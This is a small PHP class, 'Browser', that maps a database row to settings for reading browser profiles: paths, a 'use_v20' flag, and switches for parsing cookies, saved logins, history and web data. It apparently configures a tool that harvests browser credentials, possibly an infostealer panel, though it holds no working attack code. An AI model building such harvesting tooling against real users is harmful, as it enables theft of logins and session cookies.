<?php

class Browser
{
    public $name;
    public $path;
    public $type;
    public $soft_path;
    public $use_v20;
    public $parse_cookies;
    public $parse_logins;
    public $parse_history;
    public $parse_webdata;

    public function __construct($row)
    {
        $this->name             = $row["name"];
        $this->path             = $row["path"];
        $this->type             = $row["type"];
        $this->soft_path        = $row["soft_path"];
        $this->use_v20          = (bool) $row["use_v20"];
        $this->parse_cookies    = (bool) $row["parse_cookies"];
        $this->parse_logins     = (bool) $row["parse_logins"];
        $this->parse_history    = (bool) $row["parse_history"];
        $this->parse_webdata    = (bool) $row["parse_webdata"];
    }
}

?>